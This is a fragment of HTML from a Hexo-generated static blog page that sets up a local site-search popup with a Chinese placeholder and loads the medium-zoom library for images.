+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
